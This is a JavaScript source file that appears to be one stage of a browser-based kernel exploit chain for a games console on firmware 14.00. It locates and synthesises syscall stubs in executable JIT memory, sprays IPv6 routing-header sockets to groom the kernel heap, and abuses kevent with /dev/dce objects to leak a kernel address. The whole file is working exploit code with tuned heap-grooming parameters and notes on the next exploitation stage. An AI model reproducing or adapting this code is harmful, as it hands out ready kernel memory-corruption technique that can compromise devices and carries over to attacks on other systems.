import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

// ============================================================================
// hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
// v9: A/B grooming — close candidate socket right before open("/dev/dce") so
//     the dce kernel object lands in the freed victim slot (adjacent to an
//     armed RTHDR). Needed because WebKit's 256B zone is churned vs BD-J's
//     pristine app heap. Disable with URL &ab=0. (Bytecode itself does NOT
//     close — this is an environmental adaptation, not a bytecode port.)
// v8: full CANDS (30: multiples of 8..240) + phase R reclaim.
// v7: fd ceiling adaptation + B1 census/plug. v5: x86 stub rescan.
// ============================================================================

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  open: 5, close: 6,
  socket: 97, setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
  fstat: 189,
};
const IPPROTO_IP = 0, IP_DROP_MEMBERSHIP = 13;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET = 2, AF_INET6 = 28, SOCK_DGRAM = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343;
const TPL_HI = 0x54545454;
const OPS_OFF = 0x985a;
const FD_CEILING = 291;
const MAX_TRIES = 32;
const VICTIM_N = 96;
const SPRAY_FULL = 144;
const SPRAY_MIN = 128;
const CANDS = [];
for (let i = 1; i <= 30; i++) CANDS.push(i * 8);

const STATE = { ctx: null, kbase: 0n, kva: -1n, abClose: true };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

let SCAN_SEEN = 0;
function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  for (let o = 0; o < 0x80000; o += 16) {
    const lo = p.read4(toI64(base + BigInt(o))) >>> 0;
    if ((lo & 0x00ffffff) !== 0x00c0c748) continue;
    const hi = p.read4(toI64(base + BigInt(o) + 4n)) >>> 0;
    if ((hi >>> 24) !== 0x49) continue;
    const n = ((lo >>> 24) | ((hi & 0x00ffffff) << 8)) >>> 0;
    SCAN_SEEN++;
    if (n === snum) return base + BigInt(o);
  }
  return null;
}
function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;
  const w0 = p.read4(toI64(daddr)) >>> 0;
  const w1 = p.read4(toI64(daddr + 4n)) >>> 0;
  if ((w0 & 0x00ffffff) !== 0x00c0c748 || (w1 >>> 24) !== 0x49) return { err: "donor not stub" };
  const imm = ((w0 >>> 24) | ((w1 & 0x00ffffff) << 8)) >>> 0;
  if (imm !== donorNum) return { err: "donor imm mismatch" };
  let jfd = scn("jitshm_create", 0, 16384, 7);
  if (jfd < 0) { const nb = allocBuf(32); zeroBuf(nb); jfd = scn("jitshm_create", nb.addr, 16384, 7); }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
  if (typeof p.write4 !== "function") return { err: "p.write4 missing" };
  p.write4(toI64(addr), ((w0 & 0x00ffffff) | ((targetNum & 0xff) << 24)) >>> 0);
  p.write4(toI64(addr + 4n), ((w1 & 0xff000000) | ((targetNum >>> 8) & 0x00ffffff)) >>> 0);
  p.write4(toI64(addr + 8n), p.read4(toI64(daddr + 8n)) >>> 0);
  p.write4(toI64(addr + 12n), p.read4(toI64(daddr + 12n)) >>> 0);
  log("NATIVES-SYNTH", "num=" + targetNum + " rwx=" + h16(addr));
  return { addr };
}
function ensureStubs() {
  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const addr = findStubRaw(NUM[k]);
    if (addr !== null) { ctx().stubAddr.set(NUM[k], toI64(addr)); log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16)); }
  }
  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const r = synthStub(NUM[k]);
    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
    else log("SYNTH-FAIL", k + ": " + r.err);
  }
  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}
function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

const stBuf = () => allocBuf(256);
function fstatOk(fd, st) { zeroBuf(st); return scn("fstat", fd, st.addr, 0, 0, 0, 0) === 0; }
function stIno(st) { return st.dv.getUint32(4, true) >>> 0; }
function stIsChr(st) { return (st.dv.getUint16(0, true) & 0xf000) === 0x2000; }
function mkDev(path) {
  const b = allocBuf(32);
  zeroBuf(b);
  for (let i = 0; i < path.length; i++) b.dv.setUint8(i, path.charCodeAt(i));
  return b;
}

function phaseR() {
  const mreq = allocBuf(16);
  zeroBuf(mreq);
  mreq.dv.setUint32(0, 0xfaffffef, true);
  mreq.dv.setUint32(4, 0, true);
  const rdb = allocBuf(1024);
  const lenp = allocBuf(8);
  let vics = 0, sprays = 0;
  for (let fd = 3; fd <= 340; fd++) {
    let rc = scn("setsockopt", fd, IPPROTO_IP, IP_DROP_MEMBERSHIP, mreq.addr, 8, 0);
    if (rc === 0) {
      rc = scn("setsockopt", fd, IPPROTO_IP, IP_DROP_MEMBERSHIP, mreq.addr, 8, 0);
      if (rc === 0) { if (scn("close", fd) === 0) vics++; }
      continue;
    }
    zeroBuf(rdb);
    lenp.dv.setUint32(0, 1024, true);
    lenp.dv.setUint32(4, 0, true);
    if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) === 0 &&
        lenp.dv.getUint32(0, true) === RTH_LEN) {
      if (scn("close", fd) === 0) sprays++;
    }
  }
  const probe = scn("socket", AF_INET, SOCK_DGRAM, 0);
  let lowest = -1;
  if (probe >= 0) { lowest = probe; scn("close", probe); }
  log("RECLAIM", "closed vics=" + vics + " sprays=" + sprays + " lowest_free_fd=" + lowest);
  return lowest;
}

function phaseB1(dceDev) {
  const st = stBuf();
  const dceFd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
  if (dceFd < 0) fin("B1 dce open failed");
  if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed");
  const ino = stIno(st);
  if (ino === 0) fin("our own /dev/dce has no usable st_ino - refusing to guess");
  log("B1", "dce_fd=" + dceFd + " ino=" + h16(BigInt(ino)));
  const matches = [];
  for (let fd = 3; fd <= 37; fd++) {
    if (!fstatOk(fd, st)) continue;
    if (!stIsChr(st)) continue;
    if (stIno(st) === ino) matches.push(fd);
  }
  log("B1-CENSUS", "matches=" + matches.join(","));
  scn("close", dceFd);
  let closed = 0;
  for (const fd of matches) { if (scn("close", fd) === 0) closed++; }
  log("B1", "closed " + closed + "/" + matches.length + " dce fds (matched by inode, not by rdev)");
  const nullDev = mkDev("/dev/null");
  let plugged = 0;
  for (const fd of matches) {
    const pfd = scn("open", nullDev.addr, 2, 0, 0, 0, 0);
    if (pfd >= 0 && pfd === fd) plugged++;
  }
  log("B1", "plugged " + plugged + "/" + matches.length + " slots with /dev/null");
  const wfd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
  if (wfd >= 0) scn("close", wfd);
  log("B1-WARM", "dce open=" + wfd);
}

function phaseB0() {
  const anchor = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  if (anchor <= 0) fin("B0 anchor socket failed");
  const victims = [];
  let highest = anchor;
  for (let i = 0; i < VICTIM_N; i++) {
    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
    if (fd <= 0) break;
    victims.push(fd);
    if (fd > highest) highest = fd;
  }
  log("B0", "anchor=" + anchor + " victims=" + victims.length + "/" + VICTIM_N + " highest=" + highest);
  if (victims.length < 64) log("B0-WARN", "victims stalled at " + victims.length + " — fd ceiling (bytecode: restart Disc Player once)");
  return { anchor, victims, highest };
}

function phaseBSpray(tpl, baseFd) {
  let n = FD_CEILING - MAX_TRIES - 1 - baseFd;
  if (n > SPRAY_FULL) n = SPRAY_FULL;
  const shrunk = n < SPRAY_FULL;
  if (n < SPRAY_MIN) { log("B-WARN", "headroom " + n + " < " + SPRAY_MIN + " — using " + SPRAY_MIN); n = SPRAY_MIN; }
  const fds = [];
  let highest = 0, first = 0;
  for (let i = 0; i < n; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    if (i === 0) first = fd;
    fds.push(fd);
    if (fd > highest) highest = fd;
  }
  if (fds.length < 64) fin("B spray n=" + fds.length + " — fd ceiling, cold boot and retry");
  for (const fd of fds) rearm(fd, tpl);
  const headroom = FD_CEILING - 1 - highest - MAX_TRIES;
  log("B", "spray n=" + fds.length + (shrunk ? " (shrunk from " + SPRAY_FULL + ")" : "") +
      " range=" + first + ".." + highest + " headroom_for_dce=" + headroom +
      (headroom < 0 ? " <0 — WILL BUST CEILING" : ""));
  return { fds, highest };
}

function buildTemplate() {
  const tpl = allocBuf(512);
  zeroBuf(tpl);
  tpl.dv.setUint8(1, 30);
  tpl.dv.setUint8(3, 15);
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
    tpl.dv.setUint32(off, TPL_LO, true);
    tpl.dv.setUint32(off + 4, TPL_HI, true);
  }
  return tpl;
}
function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
function marked(fd, rdb, lenp) {
  zeroBuf(rdb);
  lenp.dv.setUint32(0, RTH_LEN, true);
  lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO &&
         (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}

// ---------- scan loop (v9: A/B close-grooming) ----------
function phase2Leak(rootKq, fds, dceDev, tpl) {
  const rdb = allocBuf(512);
  const lenp = allocBuf(8);
  const cl = allocBuf(64);

  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n;
  let tries = 0;

  for (let attempt = 1; attempt <= 6; attempt++) {
    if (target >= 0 || tries >= MAX_TRIES) break;
    log("KV-ATTEMPT", attempt + "/6 ab=" + (STATE.abClose ? "1" : "0"));
    for (const fd of fds) disarm(fd);
    for (const fd of fds) rearm(fd, tpl);
    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);

    for (let ci = 0; ci < CANDS.length && target < 0 && tries < MAX_TRIES; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      let fd = fds[vi];
      if (fd === -1) continue;
      if (!marked(fd, rdb, lenp)) continue;
      if (disarm(fd) !== 0) continue;
      // v9 A/B: free the candidate's slot so dce's object lands in it
      if (STATE.abClose) {
        scn("close", fd);
        fds[vi] = -1;
      }
      const dce = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
      if (dce < 0) continue;
      if (dce >= FD_CEILING) log("KV-CEILING", "dce=" + dce + " >= " + FD_CEILING);
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;
      tries++;

      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true);
      cl.dv.setInt16(8, -18, true);
      cl.dv.setInt16(10, 1, true);
      cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
      if (rc !== 0) continue;

      let joined = 0;
      for (let j = 0; j < fds.length; j++) {
        if (j === vi) continue;
        if (fds[j] === -1) continue;
        zeroBuf(rdb);
        lenp.dv.setUint32(0, RTH_LEN, true);
        lenp.dv.setUint32(4, 0, true);
        if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
        const v8 = rdb.dv.getInt32(8, true);
        const v12 = rdb.dv.getUint32(12, true) >>> 0;
        if (v8 === pageInt && v12 === 0) {
          joined++;
          if (target < 0) { target = j; targetFd = fds[j]; }
          log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
          // still armed
        } else {
          rearm(fds[j], tpl);
        }
      }

      if (target >= 0 && joined === 1) {
        zeroBuf(cl);
        cl.dv.setUint32(0, dce >>> 0, true);
        cl.dv.setInt16(8, -18, true);
        cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else {
          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi +
              " dce=" + dce + " target=" + target + " page=" + h16(page));
        }
      }
    }
  }

  if (kva === -1n)
    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — blind writes missed; try ab=0/1");
  STATE.kva = kva;
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
  return { kva, page: pageVal, targetFd };
}

export async function runKevent(c) {
  STATE.ctx = c;
  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
  else { if (!c.kbase) fin("kbase not provided - run route leak first"); STATE.kbase = num(c.kbase); }
  STATE.abClose = !(c.params && c.params.get && c.params.get("ab") === "0");
  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase) + " abClose=" + STATE.abClose);

  ensureStubs();
  log("NATIVES", Object.keys(NUM).map((k) => k + "=" + NUM[k] + "@0x" +
      num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));

  const lowest = phaseR();
  const dceDev = mkDev("/dev/dce");
  phaseB1(dceDev);
  const b0 = phaseB0();
  const tpl = buildTemplate();
  const { fds } = phaseBSpray(tpl, Math.max(lowest, b0.highest));

  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
  log("MMAP-ANON", "page=" + h16(page));
  if (page < 0x10000n) fin("mmap anon failed rv=" + mr.i32 + " errno=" + ctx().errno());

  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds, dceDev, tpl);
  log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
  fin("stage2 DONE (kva held). Next: one-time EV_ADD -23 + fakeops build (bytecode pc 6760-9200)");
}
